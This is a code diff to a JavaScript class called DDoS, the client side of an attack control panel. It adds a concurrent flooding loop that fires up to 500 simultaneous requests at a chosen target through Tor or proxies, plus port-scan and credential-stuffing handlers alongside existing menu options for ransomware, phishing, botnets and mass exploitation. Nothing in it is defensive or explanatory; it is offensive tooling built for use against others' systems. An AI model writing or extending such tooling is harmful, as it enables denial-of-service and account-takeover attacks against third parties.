@@ -67,6 +67,9 @@ class DDoS {
 
   this.isTorEnabled = false;
   this.torProxy = 'socks5://127.0.0.1:9050';
+  this.activeThreads = 0;
+  this.maxThreads = 500;
+  this.running = false;
  }
 
  createProxyRefreshButton() {
@@ -149,6 +152,7 @@ class DDoS {
    <p>Packets Sent: ${this.packetsSent}</p>
    <p>Connection Status: ${this.connectionStatus}</p>
    <p>Errors: ${this.errors}</p>
+   <p>Active Threads: ${this.activeThreads}</p>
   `;
  }
 
@@ -187,7 +191,7 @@ class DDoS {
 
  createAttackTypeSelect() {
   const attackTypeSelect = document.createElement('select');
-  const attackTypes = ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet', 'Zero-Day', 'SQL Inject', 'XSS', 'Mass Exploit'];
+  const attackTypes = ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet', 'Zero-Day', 'SQL Inject', 'XSS', 'Mass Exploit', 'Port Scan', 'Credential Stuffing'];
   attackTypes.forEach(option => {
    const opt = document.createElement('option');
    opt.value = option.toLowerCase().replace(' ', '_').replace('-', '_');
@@ -227,16 +231,22 @@ class DDoS {
 
   const menuItems = [{
    name: 'DDoS',
-   action: () => {}
+   action: () => this.setAttackType('ddos')
   }, {
    name: 'Deface',
-   action: () => {}
+   action: () => this.setAttackType('deface')
   }, {
    name: 'Connection',
-   action: () => {}
+   action: () => this.setAttackType('connect')
   }, {
    name: 'Ransomware',
-   action: () => {}
+   action: () => this.setAttackType('ransomware')
+  }, {
+   name: 'Port Scan',
+   action: () => this.setAttackType('port_scan')
+  }, {
+   name: 'Credential Stuffing',
+   action: () => this.setAttackType('credential_stuffing')
   }, {
    name: 'About Us',
    action: () => this.showAboutUs()
@@ -421,20 +431,56 @@ class DDoS {
  }
 
  async ddos(target) {
+  if (this.running) {
+   this.log('DDoS attack already in progress. Stop before starting a new one.');
+   return;
+  }
+
   this.log(`Initiating DDoS attack on ${target}...`);
   this.connectionStatus = 'Attacking';
+  this.running = true;
+
+  const attackLoop = async () => {
+   if (!this.running) {
+    this.connectionStatus = 'Idle';
+    return;
+   }
+
+   if (this.activeThreads < this.maxThreads) {
+    this.activeThreads++;
+    this.sendDDoSRequest(target)
+     .finally(() => {
+      this.activeThreads--;
+      if (this.running) {
+       attackLoop();
+      } else {
+       this.connectionStatus = 'Idle';
+      }
+     });
+   } else {
+    setTimeout(attackLoop, 10);
+   }
+  };
+
+  for (let i = 0; i < this.maxThreads / 10; i++) {
+   attackLoop();
+  }
+ }
+
+ async sendDDoSRequest(target) {
   try {
-   const response = await fetch(`/api/ddos?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(this.proxyList.value)}`, {
+   const proxy = this.isTorEnabled ? this.torProxy : this.proxyList.value;
+   const url = `/api/ddos?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}`;
+   const response = await fetch(url, {
     method: 'POST'
    });
    const data = await response.json();
    this.log(data.message);
    if (data.error) this.errors++;
+   this.packetsSent++;
   } catch (err) {
    this.log(`DDoS attack failed: ${err}`);
    this.errors++;
-  } finally {
-   this.connectionStatus = 'Idle';
   }
  }
 
@@ -563,6 +609,36 @@ class DDoS {
   }
  }
 
+ async port_scan(target) {
+  this.log(`Starting port scan on ${target}...`);
+  try {
+   const response = await fetch(`/api/port_scan?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Port scan failed: ${error}`);
+   this.errors++;
+  }
+ }
+
+ async credential_stuffing(target) {
+  this.log(`Starting credential stuffing attack on ${target}...`);
+  try {
+   const response = await fetch(`/api/credential_stuffing?target=${encodeURIComponent(target)}&apiKey=${this.apiKey}`, {
+    method: 'POST'
+   });
+   const data = await response.json();
+   this.log(data.message);
+   if (data.error) this.errors++;
+  } catch (error) {
+   this.log(`Credential stuffing attack failed: ${error}`);
+   this.errors++;
+  }
+ }
+
  sendRequest(target, method, body = null) {
   const proxy = this.availableProxies[Math.floor(Math.random() * this.availableProxies.length)];
   this.log(`${method} request sent successfully to ${target} via ${proxy}.`);
@@ -638,9 +714,26 @@ class DDoS {
    case 'mass_exploit':
     this.massExploit();
     break;
+   case 'port_scan':
+    this.port_scan(target);
+    break;
+   case 'credential_stuffing':
+    this.credential_stuffing(target);
+    break;
    default:
     this.log('Invalid attack type selected.');
   }
+ }
+
+ stop() {
+  this.running = false;
+  this.connectionStatus = 'Stopping';
+  this.log('Stopping attack...');
+ }
+
+ setAttackType(attackType) {
+  this.attackTypeSelect.value = attackType;
+  this.toggleCustomCodeArea();
  }
 
  log(message) {
